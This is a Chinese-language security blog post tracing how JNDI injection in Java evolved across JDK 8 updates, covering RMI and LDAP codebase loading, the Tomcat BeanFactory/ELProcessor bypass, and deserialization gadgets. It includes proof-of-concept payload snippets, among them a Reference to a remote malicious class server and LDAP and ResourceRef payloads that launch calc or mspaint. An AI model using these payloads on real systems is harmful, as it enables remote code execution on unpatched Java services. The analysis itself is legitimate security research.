    <url>/2022/jndi-injection-history/</url>
    
    <content type="html"><![CDATA[<p>JNDI注入的利用根据JDK更新历史可以分为两个阶段，第一阶段是在JDK8u191之前，攻击者可以利用自搭建的RMI&#x2F;LDAP恶意服务器，让客户端去获取并加载我们放置的恶意类，该阶段的利用手法不受classpath是否拥有Gadget的限制。第二阶段是在JDK8u191之后，JDK增加了trustURLCodebase配置导致这种加载恶意类的方式失效，进而找出了 javaSerializedData、javaReferenceAddress放置Gadget、ObjectFactory#getObjectInstance触发敏感方法的方式，这种方式虽然不受JDK版本的限制，但是受限于目标的classpath是否拥有可利用的Gadget。而寻找通用性更强、使用范围更广的Gadget链还值得深入研究。</p><p>JNDI注入实际上就是控制lookup()的参数，使客户端去访问恶意的RMI&#x2F;LDAP服务去加载恶意对象，从而完成代码执行漏洞利用。按照利用手法可以分为：Reference#codebase的利用、本地ClassPath的Gadget利用、本地ClassPath的ObjectFactory+Gadget的利用。</p><p>环境相关：</p><p>本次测试使用版本：JDK8u112、JDK8u121、JDK8u144、JDK8u191、JDK8u341</p><p>JDK版本下载：<a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><h2 id="1、JNDI-with-RMI"><a href="#1、JNDI-with-RMI" class="headerlink" title="1、JNDI with RMI"></a>1、JNDI with RMI</h2><h3 id="1-1-RMI-Reference-codebase-的远程利用"><a href="#1-1-RMI-Reference-codebase-的远程利用" class="headerlink" title="1.1 RMI Reference#codebase 的远程利用"></a>1.1 RMI Reference#codebase 的远程利用</h3><p>在使用lookup查找获取远程服务器上绑定的对象时，若指定的远程地址为rmi，则会进入com.sun.jndi.rmi.registry.RegistryContext#lookup(javax.naming.Name)流程，如果拿到的是Reference对象，那么会进入到加载Factory的代码逻辑，调用栈及原理如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.registry</span>.RegistryContext<span class="hljs-selector-id">#lookup</span>(javax<span class="hljs-selector-class">.naming</span>.Name)<br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.registry</span>.RegistryContext<span class="hljs-selector-id">#decodeObject</span><br>javax<span class="hljs-selector-class">.naming</span><span class="hljs-selector-class">.spi</span>.NamingManager<span class="hljs-selector-id">#getObjectInstance</span><br>javax<span class="hljs-selector-class">.naming</span><span class="hljs-selector-class">.spi</span>.NamingManager#getObjectFactoryFromReference<br></code></pre></td></tr></table></figure><p>如果在本地classpath中找不到我们指定的factory类（1），那么就会去远程codebase（2）去下载class字节码（3）回来并实例化（4）。 图为JDK8u112的代码</p><p><img src="/img/JNDI-injection-history/1.png"></p><p>若JDK8u112版本中，我们指定codebase为http地址，放置我们构造的恶意类，lookup发起请求即可执行Evil类静态代码块中的代码</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">Reference</span> <span class="hljs-keyword">reference</span> = new <span class="hljs-keyword">Reference</span>(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;Evil&quot;</span>,<span class="hljs-string">&quot;http://192.168.232.145:8888/&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/JNDI-injection-history/2.png"></p><p>修复：com.sun.jndi.rmi.registry.RegistryContext#decodeObject在JDK 8u121时增加了trustURLCodebase&#x3D;false的配置，这样就造成：如果想通过下图标签1的判断而不报错退出，只能让codebase(var8.getFactoryClassLocation())为空，这样factory只能为本地类，无法去外部加载恶意类了</p><p><img src="/img/JNDI-injection-history/3.png"></p><h2 id="2、Tomcat-BeanFactory-getObjectInstance的本地利用"><a href="#2、Tomcat-BeanFactory-getObjectInstance的本地利用" class="headerlink" title="2、Tomcat BeanFactory#getObjectInstance的本地利用"></a>2、Tomcat BeanFactory#getObjectInstance的本地利用</h2><p>我们看下如何去绕过修复补丁，在恶意服务器创建Reference对象时，可以指定classFactoryLocation为空，这样就会过掉上图标签1的判断</p><p><img src="/img/JNDI-injection-history/4.png"></p><p><img src="/img/JNDI-injection-history/5.png"></p><p>接着继续调用到javax.naming.spi.NamingManager#getObjectInstance，在该方法中完成三步：classFactory类名获取（1）、classFactory的实例化（2）、调用getObjectInstance方法（3）。在上一章节触发代码执行的是2中classFactory的实例化，现在由于补丁的限制导致classFactoryLocation为空，所以classFactory只能指定为本地ClassPath中存在的类，系统在实例化后会调用classFactory#getObjectInstance方法，即下图的标签3</p><p><img src="/img/JNDI-injection-history/6.png"></p><p>那么现在想要继续完成漏洞利用，需要在本地ClassPath中找到一个类，其实现了javax.naming.spi.ObjectFactory接口、且静态代码块&#x2F;getObjectInstance方法存在敏感操作。 Veracode找到了Tomcat中的org.apache.naming.factory.BeanFactory，Tomcat的使用相当广泛，所以这个链的实战价值还是很高的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml">//pom.xml<br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.20<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-jasper<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.20<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>pom.xml添加引入Tomcat后，我们分析下这条链：org.apache.naming.factory.BeanFactory#getObjectInstance方法中会对传入的className进行实例化、使用JDK的内省机制java.beans.Introspector#getBeanInfo  获取属性（存在getter&#x2F;setter方法的属性才会被识别），但同时该方法也提供了”别名机制“：基于传入的forceString字符串，根据&#x3D;分割拿到要执行的”setter别名方法”及String类型的参数值，最后调用反射执行。这样Gadget的source点就从”ObjectFactory接口实现类的getObjectInstance方法”变成了”本地任意类包含String类型参数的方法”</p><p><img src="/img/JNDI-injection-history/7.png"></p><p><img src="/img/JNDI-injection-history/8.png"></p><p>而Tomcat8自带的javax.el.ELProcessor#eval(String)满足该条件，可执行传入的java代码进行利用。</p><p><img src="/img/JNDI-injection-history/9.png"></p><p>构造格式如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br><span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;evil code&quot;</span>));<br></code></pre></td></tr></table></figure><p>分割得到eval方法、String参数，添加至forced map中</p><p><img src="/img/JNDI-injection-history/10.png"></p><p>最终从forced拿出方法，利用反射执行javax.el.ELProcessor#eval(“evil code”)</p><p><img src="/img/JNDI-injection-history/11.png"></p><p>至此，绕过了JDK8u121的修复</p><h2 id="3、JNDI-with-Ldap"><a href="#3、JNDI-with-Ldap" class="headerlink" title="3、JNDI with Ldap"></a>3、JNDI with Ldap</h2><h3 id="3-1、Ldap-javaSerializedData的本地利用"><a href="#3-1、Ldap-javaSerializedData的本地利用" class="headerlink" title="3.1、Ldap javaSerializedData的本地利用"></a>3.1、Ldap javaSerializedData的本地利用</h3><p>上面讲到了利用恶意RMI服务器进行漏洞利用，在JDK中还有ldap可以使用。当lookup请求地址的协议为ldap时，会走到com.sun.jndi.ldap.LdapCtx#c_lookup进行处理解析。从整体的代码结构看，涉及EXP构造的代码部分有4处：1获取ldap请求的结果、2解析结果拿到attribute属性值、3根据attribute的属性组装Reference类、4加载远程的恶意class并实例化造成代码执行。其中第4步与上章节中的JNDI_RMI解析调用流程一致，但是JDK8u121是在RegistryContext#decodeObject层做的trustURLCodebase修复限制，与ldap使用codebase加载factory类的流程无关联。所以JNDI_RMI的修复方案并不影响JNDI_LDAP的利用</p><p><img src="/img/JNDI-injection-history/12.png"></p><p>如果存在javaClassName属性，则进入到com.sun.jndi.ldap.Obj#decodeObject组装Reference的流程。代码比较清晰，也是EXP构造比较重要的一步，逐个分析下：标签1 如果存在javaSerializedData属性值，进入deserializeObject反序列化操作。从属性名字能看出来是java的序列化数据，且在反序列化过程中未做过滤。所以我们可以把恶意对象绑定在javaSerializedData属性上，这是JNDI-LDAP的第一个利用点</p><p><img src="/img/JNDI-injection-history/13.png"></p><p>com.sun.jndi.ldap.Obj#deserializeObject</p><p><img src="/img/JNDI-injection-history/14.png"></p><h3 id="3-2、Ldap-javaReferenceAddress的本地利用"><a href="#3-2、Ldap-javaReferenceAddress的本地利用" class="headerlink" title="3.2、Ldap javaReferenceAddress的本地利用"></a>3.2、Ldap javaReferenceAddress的本地利用</h3><p>接着回到decodeObject往下走：标签2 如果存在javaRemoteLocation属性值，就进入decodeRmiObject操作：根据javaClassName、javaRemoteLocation、javaCodeBase等属性值组装Reference对象并返回</p><p><img src="/img/JNDI-injection-history/15.png"></p><p>接着回到decodeObject往下走：进入标签3 如果存在objectClass属性且其包括javaNamingReference，则进入com.sun.jndi.ldap.Obj#decodeReference组装Reference的操作</p><p><img src="/img/JNDI-injection-history/16.png"></p><p>当存在javaClassName属性时，最终返回对象<code>Reference(javaClassName, javaFactory, javacodebase[0])</code>。如果存在javaReferenceAddress值，进入组装RefAddr对象的流程，可以看到如果构造的数据满足条件，与javaSerializedData属性的解析过程一样，进入deserializeObject反序列化流程，这是JNDI-LDAP的第二个利用点</p><p><img src="/img/JNDI-injection-history/17.png"></p><h3 id="3-3、Ldap-Reference-codebase的远程利用"><a href="#3-3、Ldap-Reference-codebase的远程利用" class="headerlink" title="3.3、Ldap Reference#codebase的远程利用"></a>3.3、Ldap Reference#codebase的远程利用</h3><p>拿到了Reference对象，接着回到com.sun.jndi.ldap.LdapCtx#c_lookup的解析流程，执行第4步的getObjectInstance方法，该方法与JNDI_RMI解析过程的javax.naming.spi.NamingManager#getObjectInstance一致，都是获取codebase加载远程factory类并实例化。这是JNDI-LDAP的第三个利用点</p><p><img src="/img/JNDI-injection-history/18.png"></p><p>修复：com.sun.naming.internal.VersionHelper12#loadClass(java.lang.String, java.lang.String)加载外部factory时，在JDK 8u191时增加了com.sun.jndi.ldap.object.trustURLCodebase&#x3D;false的配置，造成loadClass()直接返回null，无法通过codebase去加载构造的外部恶意类。但是上面提到的第一种javaSerializedData、第二种RefAddr方式仍然可以使用</p><p><img src="/img/JNDI-injection-history/19.png"></p><p><img src="/img/JNDI-injection-history/20.png"></p><p>基本的解析流程都分析完了，本地测试时可以起个ldap服务构造EXP，搭建ldap服务可使用ldapsdk包。可以maven加载也可以单独引入：<a href="https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk/3.1.1">https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk/3.1.1</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">//pom.xml<br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ldap服务代码可参考<a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java">https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java</a></p><h2 id="4、版本相关问题"><a href="#4、版本相关问题" class="headerlink" title="4、版本相关问题"></a>4、版本相关问题</h2><p>JDK8系列最新版本(8u341)测试，未对JNDI_LDAP的第一种javaSerializedData、第二种javaReferenceAddress、Tomcat BeanFactory#getObjectInstance的利用方式进行限制。如果目标ClassPath存在Gadget，还是可以继续利用的。我们分别来看下：</p><p>1、JNDI_LDAP的第一种javaSerializedData利用方式，只需要把恶意类设置为javaSerializedData的属性值即可</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//恶意服务端设置两个属性javaClassName、javaSerializedData</span><br>e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>)</span>;<br>e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, Serializer.<span class="hljs-params">serialize</span>(<span class="hljs-params">new</span> CommonsBeanutils1()</span>.get<span class="hljs-constructor">Object(<span class="hljs-string">&quot;mspaint&quot;</span>)</span>));<br></code></pre></td></tr></table></figure><p><img src="/img/JNDI-injection-history/21.png"></p><p>2、JNDI_LDAP的第二种javaReferenceAddress利用方式，对于RefAddr对象的数据构造可参考com.sun.jndi.ldap.Obj#decodeReference</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-number">1</span>、将javaReferenceAddress属性值的首字符做为分割符，我这里使用!符号<br><span class="hljs-number">2</span>、第一跟第二个分隔符中为RefAddr position，<span class="hljs-type">int</span>类型数据，使用<span class="hljs-number">1</span><br><span class="hljs-number">3</span>、第二跟第三个分隔符中为RefAddr type，<span class="hljs-type">String</span>类型数据，使用a<br><span class="hljs-number">4</span>、第三个与第四个分隔符在一起，后面是经过base64编码的序列化数据，使用cb链演示<br></code></pre></td></tr></table></figure><p><img src="/img/JNDI-injection-history/22.png"></p><p>恶意服务端设置三个属性objectClass、javaClassName、javaReferenceAddress</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>)</span>;<br>e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>)</span>;<br>e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;javaReferenceAddress&quot;</span>,<span class="hljs-string">&quot;!1!a!!&quot;</span>+<span class="hljs-params">new</span> BASE64Encoder()</span>.encode(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Serializer</span>.</span></span>serialize(<span class="hljs-keyword">new</span> <span class="hljs-constructor">CommonsBeanutils1()</span>.get<span class="hljs-constructor">Object(<span class="hljs-string">&quot;mspaint&quot;</span>)</span>)));<br></code></pre></td></tr></table></figure><p><img src="/img/JNDI-injection-history/23.png"></p><p>成功在JDK8系列最新版本完成利用</p><p>3、Tomcat BeanFactory#getObjectInstance的本地利用方式，可以看到在JDK8系列的最新版本8u341利用成功</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ResourceRef resourceRef = <span class="hljs-built_in">new</span> ResourceRef(&quot;javax.el.ELProcessor&quot;,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">false</span>,&quot;org.apache.naming.factory.BeanFactory&quot;,<span class="hljs-keyword">null</span>);<br>resourceRef.<span class="hljs-keyword">add</span>(<span class="hljs-built_in">new</span> StringRefAddr(&quot;forceString&quot;,&quot;x=eval&quot;));<br>resourceRef.<span class="hljs-keyword">add</span>(<span class="hljs-built_in">new</span> StringRefAddr(&quot;x&quot;,&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;<span class="hljs-built_in">new</span> java.lang.ProcessBuilder[<span class="hljs-string">&#x27;(java.lang.String[])&#x27;</span>]([<span class="hljs-string">&#x27;calc.exe&#x27;</span>]).<span class="hljs-keyword">start</span>()\&quot;)&quot;));<br></code></pre></td></tr></table></figure><p><img src="/img/JNDI-injection-history/24.png"></p><h2 id="5、参考"><a href="#5、参考" class="headerlink" title="5、参考"></a>5、参考</h2><p><a href="https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA">https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA</a></p><p><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a></p><p><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p><p><a href="https://evilpan.com/2021/12/13/jndi-injection/">https://evilpan.com/2021/12/13/jndi-injection/</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSec</tag>
      
      <tag>JNDI</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
